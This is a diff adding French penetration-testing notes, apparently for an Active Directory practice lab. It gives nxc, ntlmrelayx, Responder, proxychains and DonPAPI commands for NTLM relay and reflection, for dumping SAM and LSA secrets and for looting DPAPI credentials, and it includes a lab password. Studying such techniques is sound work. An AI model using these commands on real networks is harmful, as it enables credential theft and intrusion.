@@ -1,3 +1,24 @@
+Identifier les machines vulnérables (nécessite un compte)
+
+```bash
+nxc smb smb_hosts -d north -u sql_svc -p YouWillNotKerboroast1ngMeeeeee -M ntlm_reflection
+```
+
+sans compte on peut mettre un relay en place vers toutes les machines
+
+```bash
+ntlmrelayx.py -tf smb_hosts -smb2support -socks -multi-relay
+```
+
+puis utiliser le module avec proxychains
+
+```bash
+proxychains nxc smb smb_hosts -d 'north' -u 'eddard.stark' -p '' -M ntlm_reflection
+```
+
+Ceci dit on ne peut pas coercer vers nous même à ce moment la, on peut essayer de coercer vers une autre machine que nous controllons ?
+
+
 Si les protocoles LLMNR,NBT-NS et MDNS sont activés :
 
 1. Lancer Responder pour empoisonner les requêtes
@@ -25,6 +46,13 @@ On peut ensuite dump la SAM et LSA avec nxc et proxychains
 ```bash
 proxychains nxc smb 192.168.19.23 -d '' -u '' -p '' --sam
 proxychains nxc smb 192.168.19.23 -d '' -u '' -p '' --lsa
+```
+
+Puis on peut loot avec nxc et DonPAPI
+
+```bash
+proxychains4 nxc smb 192.168.19.23 -d '' -u '' -p '' --dpapi
+proxychains DonPAPI collect -d '' -u '' -p '' -t 192.168.19.23
 ```
 
 
